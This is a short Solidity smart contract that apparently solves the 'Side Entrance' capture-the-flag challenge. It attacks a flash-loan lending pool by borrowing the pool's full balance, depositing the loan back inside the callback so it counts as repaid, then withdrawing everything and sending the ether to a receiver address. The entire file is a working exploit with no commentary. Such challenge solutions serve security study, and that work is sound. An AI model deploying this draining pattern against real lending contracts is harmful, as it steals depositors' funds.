pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

contract AttackerSideEntrance {
    SideEntranceLenderPool private pool;

    constructor (SideEntranceLenderPool pool_) {
        pool = pool_;
    }

    function attack(address receiver) external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(receiver).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}